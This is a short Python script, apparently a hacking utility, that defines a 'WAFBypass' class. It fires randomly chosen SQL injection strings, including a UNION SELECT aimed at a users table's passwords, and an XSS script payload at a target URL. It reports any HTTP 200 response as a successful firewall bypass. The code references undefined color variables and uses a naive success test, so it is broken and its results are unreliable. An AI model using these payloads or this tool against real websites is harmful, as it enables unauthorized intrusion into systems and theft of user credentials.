import random
import requests

class WAFBypass:
    def __init__(self):
        self.payloads = [
            "' OR 1=1 --", 
            "<script>alert('XSS')</script>", 
            "1' AND 1=1 --", 
            "admin' UNION SELECT null, password FROM users --"
        ]

    def attempt_bypass(self, url):
        payload = random.choice(self.payloads)
        bypass_url = f"{url}?input={payload}"
        response = requests.get(bypass_url)
        
        if response.status_code == 200:
            print(f"{G}WAF Bypass successful at: {bypass_url}{N}")
        else:
            print(f"{R}WAF Bypass failed at: {bypass_url}{N}")
